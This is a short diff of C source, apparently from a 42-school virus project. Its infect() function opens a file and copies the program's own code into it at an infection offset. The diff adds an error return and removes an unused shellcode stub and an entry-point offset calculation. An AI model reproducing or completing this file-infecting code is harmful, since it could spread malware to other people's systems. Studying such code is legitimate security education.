@@ -6,7 +6,7 @@
 /*   By: nguiard <marvin@42.fr>                     +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2024/10/31 10:47:01 by nguiard           #+#    #+#             */
-/*   Updated: 2024/11/05 14:10:51 by nguiard          ###   ########.fr       */
+/*   Updated: 2024/11/05 17:56:55 by nguiard          ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -32,6 +32,7 @@ bool	infect(profiling *this, const str path) {
 	open(fd, path, O_RDWR);
 	if (fd < 0) {
 		printf(FILE_LINE("open failed: %ld\n"), ret);
+		return false;
 	}
 
 	fstat(ret, fd, &file_stat);
@@ -55,20 +56,6 @@ bool	infect(profiling *this, const str path) {
 		goto infect_end;
 	}
 	
-	// ft_memcpy(data.file + data.signature_offset, (const byte *)SIGNATURE, SIGNATURE_LEN);
-
-	str shellcode = "\xb8\x03\x00\x00\x00" \
-					"\xbf\x2a\x00\x00\x00" \
-					"\x0f\x05" \
-					"\x48\x8d\x35\x00\x00\x00\x00"	\
-					"\x48\x89\xf0" \
-					"\xff\xd0";
-
-	size_t	entry_off = data.original_entry_point - data.infection_offset - 0x13;
-
-	(void)shellcode;
-	(void)entry_off;
-
 	//	Copy the code
 	ft_memcpy(file_origin + data.infection_offset, this->start_rip, this->size);
 	
